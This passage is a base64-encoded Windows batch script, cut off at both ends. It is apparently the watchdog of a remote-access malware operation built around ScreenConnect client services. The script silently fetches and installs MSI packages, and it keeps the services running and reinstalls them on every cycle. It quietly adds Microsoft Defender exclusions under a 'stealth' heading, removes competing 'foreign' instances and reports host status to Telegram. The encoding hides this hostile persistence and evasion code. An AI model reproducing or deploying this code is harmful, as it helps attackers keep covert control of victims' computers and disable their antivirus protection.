dXBncmFkZSByZW1vdmFsKSBjYW4gTkVWRVIgc3RhcnQuIERlbGV0ZSBpdCBhbmQgZmFsbCB0aHJv
dWdoIHRvIHRoZQ0KcmVtIGZyZXNoLWluc3RhbGwgbGFkZGVyIGJlbG93IGluc3RlYWQgb2YgYWxl
cnRpbmcgIndvbnQgc3RhcnQiIGZvcmV2ZXIuDQppZiAiJUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQ
UklNX09LJSI9PSIwIiAoDQogIHNldCAiUkVHU1RBVEU9dW5rbm93biINCiAgaWYgZXhpc3QgIiVX
RCVcb3duX2xpYi5wczEiIGZvciAvZiAiZGVsaW1zPSIgJSVSIGluICgncG93ZXJzaGVsbCAtTm9Q
cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
JVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUtFRVBfRlAlIiAtV29ya0Rp
ciAiJVdEJSInKSBkbyBzZXQgIlJFR1NUQVRFPSUlUiINCiAgZWNobyBvcnBoYW5fY2hlY2s9IVJF
R1NUQVRFIT4+IiVMT0clIg0KICBpZiAvSSAiIVJFR1NUQVRFISI9PSJubyIgKA0KICAgIGVjaG8g
b3JwaGFuX3NlcnZpY2VfZGVsZXRlPj4iJUxPRyUiDQogICAgc2MgZGVsZXRlICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQogICAgc2V0ICJJTlNUQUxMRUQ9MCIN
CiAgKQ0KKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBw
b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
YXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0Ql
IiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJzdmMtd29udC1zdGFydCIgPm51bCAyPiYxDQogIGNh
bGwgOlRnU3RhdGUgRE9XTiAiU2NyZWVuQ29ubmVjdCAoJUtFRVBfRlAlKSBpbnN0YWxsZWQgYnV0
IHdvbnQgc3RhcnQiDQogIGdvdG8gOkFmdGVySGVhbA0KKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEi
IGdvdG8gOkFmdGVySGVhbA0KDQpyZW0g4pSA4pSAIFtEXSBwcmltYXJ5IFNDIG1pc3NpbmcgLSBo
ZWFsIGxhZGRlciDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIANCnJlbSBNMTI6IEZJUlNUIHJlcGFpciB0aGUgcmVnaXN0ZXJl
ZCBwcm9kdWN0IChyZWNyZWF0ZXMgc2VydmljZSB3aXRob3V0DQpyZW0gdG91Y2hpbmcgdGhlIEFM
VCBpbnN0YW5jZSk7IGZyZXNoIG1zaWV4ZWMgaW5zdGFsbCBvbmx5IGFzIGZhbGxiYWNrLg0KZWNo
byBzdmMgbWlzc2luZyAtIGhlYWwgYmVnaW4+PiIlTE9HJSINCmNhbGwgOlJlcGFpclJlZ2lzdGVy
ZWQgIiVLRUVQX0ZQJSINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAl
KSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJJ
TlNUQUxMRUQ9MSINCiAgc2V0ICJQUklNX09LPTEiDQogIGdvdG8gOkFmdGVySGVhbA0KKQ0KcmVt
IHJlZnVzZSBmcmVzaCAvaSBpZiBwcm9kdWN0IHN0aWxsIHJlZ2lzdGVyZWQgLSBVcGdyYWRlIHRh
YmxlIGNhbiB3aXBlIEFMVC9HUllYQQ0Kc2V0ICJSRUdTVEFURT11bmtub3duIg0KaWYgZXhpc3Qg
IiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUtFRVBf
RlAlIiAtV29ya0RpciAiJVdEJSJgKSBkbyBzZXQgIlJFR1NUQVRFPSUlUiINCmlmIC9JICIhUkVH
U1RBVEUhIj09InllcyIgKA0KICBlY2hvIHByaW1hcnlfcmVnaXN0ZXJlZF9za2lwX2ZyZXNoX2lu
c3RhbGw+PiIlTE9HJSINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBz
dGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAicmVnaXN0ZXJlZC1z
dHVjayIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRE9XTiAiUHJpbWFyeSByZWdpc3RlcmVk
IGJ1dCBzZXJ2aWNlIG1pc3NpbmcgLSAvZmEgZmFpbGVkOyByZWZ1c2VkIC9pIHRvIHByb3RlY3Qg
QUxUL0dSWVhBIg0KICBnb3RvIDpBZnRlckhlYWwNCikNCnJlbSBPMzc6IHJlZnVzZSBzZXZyeiAv
aSB3aGVuIGdyeXhhIGFscmVhZHkgcHJlc2VudCDigJQgc2hhcmVkIGxlZ2FjeSBVcGdyYWRlQ29k
ZXMNCnJlbSB7MEM5NDQ0OEJ9L3sxRjg1RDdGRX0gbWFrZSBzaWJsaW5nIG1zaWV4ZWMgL2kga25v
Y2sgR3J5eGEgT0ZGTElORSBpbiBwYW5lbC4NCnNldCAiR1JFRz11bmtub3duIg0KaWYgZXhpc3Qg
IiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUdSWVhB
X0ZQJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8gc2V0ICJHUkVHPSUlUiINCnNjIHF1ZXJ5ICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2
ZWwgMSBzZXQgIkdSRUc9eWVzIg0KaWYgL0kgIiFHUkVHISI9PSJ5ZXMiICgNCiAgZWNobyBwcmlt
YXJ5X3NraXBfaV9wcm90ZWN0X2dyeXhhPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmls
ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
X2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAt
RXh0cmEgInByb3RlY3QtZ3J5eGEtc2tpcC1wcmltYXJ5LWkiID5udWwgMj4mMQ0KICBjYWxsIDpU
Z1N0YXRlIERPV04gIlByaW1hcnkgbWlzc2luZyAtIHJlZnVzZWQgc2V2cnogL2kgdG8gcHJvdGVj
dCBHcnl4YSAoc2hhcmVkIFNDIFVwZ3JhZGVDb2Rlcyk7IC9mYSBvbmx5Ig0KICBnb3RvIDpBZnRl
ckhlYWwNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1VS
TCUiICJtYWluIg0KaWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lf
UEtHMSU/dD0lUkFORE9NJSIgImdpdGh1Yi1wa2ciDQppZiAiJUlOU1RBTExFRCUiPT0iMCIgY2Fs
bCA6SW5zdGFsbE1zaSAiJU1TSV9QS0cyJSIgImpzZGVsaXZyLXBrZyINCmlmICIlSU5TVEFMTEVE
JSI9PSIwIiAoDQogIHJlbSBwcmVmZXIgd29ya2VyLWNhY2hlZCAud3VjYWNoZVxwa2cubXNpIChz
YW1lIGJpbmFyeSBhcyBkZXBsb3kpDQogIGF0dHJpYiAtaCAtcyAtciAiJU1TSUNBQ0hFJSIgPm51
bCAyPiYxDQogIGZvciAlJUYgaW4gKCIlTVNJQ0FDSEUlIikgZG8gaWYgJSV+ekYgR1RSIDEwMDAw
MDAgKA0KICAgIGVjaG8gd3VjYWNoZV9wa2dfcmV0cnk+PiIlTE9HJSINCiAgICBhdHRyaWIgLWgg
LXMgLXIgIiVNU0klIiA+bnVsIDI+JjENCiAgICBjb3B5IC95ICIlTVNJQ0FDSEUlIiAiJU1TSSUi
ID5udWwgMj4mMQ0KICApDQogIGZvciAlJUYgaW4gKCIlTVNJJSIpIGRvIGlmICUlfnpGIEdUUiAx
MDAwMDAwICgNCiAgICBlY2hvIGNhY2hlIHJldHJ5IGluc3RhbGw+PiIlTE9HJSINCiAgICBjYWxs
IDpOb01zaVBvbGljeQ0KICAgIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExV
U0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51
bCAyPiYxDQogICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCiAgICBlY2hvIGNhY2hlIG1z
aWV4ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCiAgICBpZiAiIU1TSUVYSVQhIj09IjE2MTgi
ICgNCiAgICAgIHRpbWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bA0KICAgICAgbXNpZXhlYyAvaSAi
JU1TSSUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9M
KnYgIiVXRCVcbXNpX2hlYWwyLmxvZyIgPm51bCAyPiYxDQogICAgICBzZXQgIk1TSUVYSVQ9IUVS
Uk9STEVWRUwhIg0KICAgICAgZWNobyBjYWNoZV9yZXRyeTE2MThfZXhpdD0hTVNJRVhJVCE+PiIl
TE9HJSINCiAgICApDQogICAgY2FsbCA6V2FpdFN2Yw0KICApDQopDQpjYWxsIDpSZXN0b3JlQWx0
DQpjYWxsIDpFbnN1cmVHcnl4YU11c3QNCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoDQogIGlmIGV4
aXN0ICIlV0QlXG1zaV9oZWFsLmxvZyIgKA0KICAgIGVjaG8gLS0tIG1zaV9oZWFsLmxvZyB0YWls
IC0tLT4+IiVMT0clIg0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
LUNvbW1hbmQgIkdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAnJVdEJVxtc2lfaGVhbC5sb2cnIC1U
YWlsIDEwIiA+PiIlTE9HJSIgMj4mMQ0KICApDQogIGlmIG5vdCBkZWZpbmVkIE1TSUVYSVQgc2V0
ICJNU0lFWElUPWZldGNoLWZhaWwiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
Y3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgIm1zaS1m
YWlsZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIEZBSUwgIk1TSSBpbnN0YWxsIGZhaWxl
ZCBvbiBhbGwgc291cmNlcyAobXNpZXhlYyBleGl0ICVNU0lFWElUJSkiDQopIGVsc2UgKA0KICBl
Y2hvIHN2YyByZXN0b3JlZD4+IiVMT0clIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
IiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJy
ZXN0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgUkVTVE9SRUQgIlNjcmVlbkNvbm5l
Y3QgcmVpbnN0YWxsZWQgT0siDQopDQoNCjpBZnRlckhlYWwNCnJlbSBNMTY6IEFMVCBwcmVzZW50
LWJ1dC1zdG9wcGVkIC0+IHJlc3RhcnQsIHRoZW4gcmVwYWlyLWJ5LUdVSUQgKGV2ZXJ5IHRpY2sp
DQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQpp
ZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
QUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAg
IGVjaG8gYWx0IHN0b3BwZWQgLSByZXN0YXJ0L3JlcGFpcj4+IiVMT0clIg0KICAgIG5ldCBzdGFy
dCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQogICAgc2Mgc3Rh
cnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KICAgIHRpbWVv
dXQgL3QgNSAvbm9icmVhayA+bnVsDQogICAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICAgIGlmIGVycm9ybGV2ZWwgMSBp
ZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
cmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
LUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAy
PiYxDQogICkNCikNCnJlbSBNMTc6IEFMVCBzZXJ2aWNlIGVudHJ5IGRlbGV0ZWQgYnV0IHByb2R1
Y3QgcmVnaXN0ZXJlZCAtPiByZXBhaXItYnktR1VJRCBldmVyeSB0aWNrDQpzYyBxdWVyeSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEg
KA0KICBlY2hvIGFsdF9taXNzaW5nX3RyeV9yZXBhaXI+PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVX
RCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVw
YWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KKQ0KcmVt
IChleHRlcm1pbmF0aW9uIGFscmVhZHkgcmFuIHByZS1oZWFsIGluIFtFXTsgZm9yZWlnbiBzdXJ2
aXZvcnMgY291bnRlZCB0aGVyZSkNCg0KcmVtIOKUgOKUgCBbRl0gc3RlYWx0aCByZS1zZWN1cmUg
KHF1aWV0IERlZmVuZGVyIGV4Y2x1c2lvbiByZWZyZXNoKSDilIDilIANCnBvd2Vyc2hlbGwgLU5v
UHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQg
InRyeSB7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJyVXRCUnLCclRVRMJScgLUVy
cm9yQWN0aW9uIFN0b3AgfSBjYXRjaCB7fSIgPm51bCAyPiYxDQoNCnJlbSDilIDilIAgW0ddIHBl
cmlvZGljIGZ1bGwgcmUtc2VjdXJlIGV2ZXJ5IH4yIGgg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpwb3dlcnNoZWxsIC1Ob1Byb2Zp
bGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclV0QlXG93bl9zZWN1
cmUuY21kJykgLWFuZCAoKCAtbm90IChUZXN0LVBhdGggJyVXRCVcc2VjLmZsYWcnKSkgLW9yICgo
KEdldC1EYXRlKSAtIChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcc2VjLmZsYWcnKS5MYXN0
V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1nZSAyKSkpeyBleGl0IDEgfSBlbHNlIHsgZXhpdCAwIH0i
ID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAgZWNobyBwZXJpb2RpYyByZS1zZWN1cmU+
PiIlTE9HJSINCiAgY2FsbCAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPj4iJUxPRyUiIDI+JjENCiAg
ZWNobyBkb25lPiIlV0QlXHNlYy5mbGFnIg0KKQ0KDQpyZW0g4pSA4pSAIFtHMl0gR3J5eGEgTVVT
VC1SVU4gKGxpZ2h0IGV2ZXJ5IHRpY2sgKyBkZWVwIGV2ZXJ5IDhoKSDilIDilIDilIDilIANCnJl
bSBIQVJEOiBuZXZlciByZWluc3RhbGwgd2hlbiBzZXJ2aWNlIFJ1bm5pbmcgKHBhbmVsIGR1cGxp
Y2F0ZXMpLg0KcmVtIERlZXAgb25seSBjaGVja3MgRlAgZHJpZnQ7IFRDUCBpcyBhZHZpc29yeS4g
ZmluZHN0ciAvQiBIRUFMVEhZIChub3QgVU5IRUFMVEhZKS4NCnNldCAiR1JZWEFfT0s9MCINCnNl
dCAiR1JZWEFfV0FTPTAiDQpzZXQgIkRPX0RFRVA9MCINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNm
ZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdy
eXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwi
DQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmQgIlJV
Tk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUllYQV9XQVM9MSINCg0KcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKCAtbm90IChU
ZXN0LVBhdGggJyVHUllYQV9ERUVQJScpKSAtb3IgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAtTGl0
ZXJhbFBhdGggJyVHUllYQV9ERUVQJScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbEhvdXJz
IC1nZSA4KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQppZiBlcnJvcmxl
dmVsIDEgc2V0ICJET19ERUVQPTEiDQoNCnJlbSBBbHJlYWR5IFJ1bm5pbmcgKyBub3QgZGVlcCBk
dWUg4oaSIHplcm8gbXNpZXhlYyAoc3RvcHMgcGFuZWwgZHVwbGljYXRlcykNCmlmICIlR1JZWEFf
V0FTJSI9PSIxIiBpZiAiJURPX0RFRVAlIj09IjAiICgNCiAgc2V0ICJHUllYQV9PSz0xIg0KICBl
Y2hvIGdyeXhhX3NraXBfYWxyZWFkeV9ydW5uaW5nPj4iJUxPRyUiDQogIGdvdG8gOkdyeXhhQWZ0
ZXINCikNCg0KaWYgIiVET19ERUVQJSI9PSIxIiAoDQogIGVjaG8gZ3J5eGFfZGVlcF9iZWdpbj4+
IiVMT0clIg0KICBzZXQgIkdSRVM9Ig0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9y
IC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIu
cHMxIiAtQWN0aW9uIGdyeXhhLWVuc3VyZSAtRGVlcCAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVN
T05WRVIlYCkgZG8gc2V0ICJHUkVTPSUlUiINCiAgZWNobyBncnl4YV9kZWVwX3Jlc3VsdD0hR1JF
UyE+PiIlTE9HJSINCiAgZWNobyAhR1JFUyF8IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFkiID5u
dWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQogIHJlbSBBbHdheXMg
YWR2YW5jZSBkZWVwIHRpbWVyIHdoZW4gUnVubmluZyAoRlAgY2hlY2sgZG9uZTsgYXZvaWQgZGVl
cCBldmVyeSB0aWNrKQ0KICBpZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFj
a3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBkbyBpZiAv
SSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0KICBzYyBxdWVyeSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAg
aWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgc2V0ICJHUllYQV9PSz0xIg0KICAgIGVjaG8gZG9u
ZT4iJUdSWVhBX0RFRVAlIg0KICApIGVsc2UgaWYgIiVHUllYQV9PSyUiPT0iMCIgKA0KICAgIGNh
bGwgOkVuc3VyZUdyeXhhTXVzdA0KICAgIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
JUdSWVhBX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICAgIGlmIG5vdCBlcnJvcmxldmVs
IDEgKHNldCAiR1JZWEFfT0s9MSIgJiBlY2hvIGRvbmU+IiVHUllYQV9ERUVQJSIpDQogICkgZWxz
ZSAoDQogICAgZWNobyBkb25lPiIlR1JZWEFfREVFUCUiDQogICkNCikgZWxzZSAoDQogIGlmIGV4
aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogICAgc2V0ICJHUkVTPSINCiAgICBmb3IgL2YgInVz
ZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
Y3Rpb24gZ3J5eGEtZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiVgKSBkbyBz
ZXQgIkdSRVM9JSVSIg0KICAgIGVjaG8gZ3J5eGFfbGlnaHRfcmVzdWx0PSFHUkVTIT4+IiVMT0cl
Ig0KICAgIGVjaG8gIUdSRVMhfCBmaW5kc3RyIC9JIC9CIC9DOiJIRUFMVEhZIiA+bnVsDQogICAg
aWYgbm90IGVycm9ybGV2ZWwgMSAoc2V0ICJHUllYQV9PSz0xIikgZWxzZSAoY2FsbCA6RW5zdXJl
R3J5eGFNdXN0KQ0KICApIGVsc2UgKA0KICAgIGNhbGwgOkVuc3VyZUdyeXhhTXVzdA0KICApDQop
DQoNCjpHcnl4YUFmdGVyDQpyZW0gcmVmcmVzaCBGUCBhZnRlciBlbnN1cmUgKG1heSBoYXZlIHJv
dGF0ZWQpDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5z
PTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09
IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3Qg
Q2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3Js
ZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCg0KaWYgIiVHUllYQV9PSyUiPT0iMSIgaWYgIiVHUllY
QV9XQVMlIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBz
dGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAiZ3J5eGEtcmVzdG9y
ZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIFJFU1RPUkVEICJHcnl4YSBTY3JlZW5Db25u
ZWN0IGhlYWx0aHkgKHN2YyBydW5uaW5nKSINCikNCmlmICIlR1JZWEFfT0slIj09IjAiICgNCiAg
cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5
cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdE
JSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAiZ3J5eGEtbXVzdC1mYWlsIiA+bnVsIDI+JjENCiAg
Y2FsbCA6VGdTdGF0ZSBET1dOICJHcnl4YSBNVVNULVJVTiAtIHNlcnZpY2Ugbm90IFJ1bm5pbmcg
YWZ0ZXIgaGVhbCINCikNCg0KcmVtIOKUgOKUgCBbSF0gcXVpZXQgZGlnZXN0IChza2lwIGhlYWx0
aHkgaG9zdHMg4oCUIHdhcyBmbG9vZGluZyBUZWxlZ3JhbSkg4pSA4pSADQppZiBleGlzdCAiJVdE
JVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhl
Y3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0
ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlID5udWwgMj4mMQ0Kc2V0ICJORUVEX0hC
PTAiDQppZiAiJVBSSU1fT0slIj09IjAiIHNldCAiTkVFRF9IQj0xIg0KaWYgJUZPUkVJR05fTEVG
VCUgR1RSIDAgc2V0ICJORUVEX0hCPTEiDQppZiAiJUdSWVhBX09LJSI9PSIwIiBzZXQgIk5FRURf
SEI9MSINCmlmICIlTkVFRF9IQiUiPT0iMCIgKA0KICBlY2hvIGhiX3NraXBfaGVhbHRoeT4+IiVM
T0clIg0KKSBlbHNlICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
Q29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJUhCRkxBRyUnKSAtYW5kIChOZXctVGltZVNwYW4gLVN0
YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVIQkZMQUclJykuTGFzdFdyaXRlVGltZSkuVG90
YWxNaW51dGVzIC1sdCAzNjApeyBleGl0IDAgfSBlbHNlIHsgZXhpdCAxIH0iID5udWwgMj4mMQ0K
ICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gaGI+JUhCRkxBRyUNCiAgICBwb3dlcnNoZWxs
IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
ICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSBIQiAtTW9kZSBjb21wYWN0IC1CdWlsZCAlTU9O
VkVSJSAtQ291bnQgIUNPVU5UISA+bnVsIDI+JjENCiAgICBlY2hvIGRpZ2VzdCBIQiBzZW50Pj4i
JUxPRyUiDQogICkNCikNCg0KcmVtIOKUgOKUgCBbSV0gc2VsZi11cGRhdGUgYXBwbHkgKGxhc3Qg
dGhpbmcgdGhpcyB0aWNrKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIANCmlmICIlU0VMRl9VUEQlIj09IjEiICgNCiAgZWNobyBzZWxmLXVwZGF0ZSBhcHBseT4+IiVM
